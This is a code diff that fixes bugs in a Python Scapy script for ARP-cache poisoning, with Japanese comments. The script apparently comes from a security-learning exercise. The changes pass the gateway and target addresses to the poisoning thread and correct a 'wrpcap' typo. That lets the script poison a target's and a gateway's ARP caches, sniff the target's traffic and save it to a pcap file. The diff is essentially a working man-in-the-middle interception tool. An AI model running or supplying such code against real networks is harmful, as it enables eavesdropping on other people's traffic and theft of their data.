@@ -18,7 +18,8 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)
 
 def get_mac(ip_address):
-    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), timeout=2, retry=10)
+    print(f'[*]Try get mac {ip_address}.')
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
     #レスポンス内のMACアドレスを返却
     for s, r in responses:
         return r[Ether].src
@@ -68,7 +69,7 @@ print_mac(target_ip, target_mac)
 
 #汚染用のスレッド起動
 stop_event = threading.Event()
-poison_thread = threading.Thread(target=poison_target)
+poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac, stop_event))
 poison_thread.start()
 
 print(f'[*]Starting sniffer for {packet_count} packets')
@@ -77,7 +78,7 @@ bpf_filter = f'ip host {target_ip}'
 packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
 
 #キャプチャーしたパケットの保存
-wrcap('arper.pcap', packets)
+wrpcap('arper.pcap', packets)
 
 #汚染用スレッドの停止
 stop_event.set()
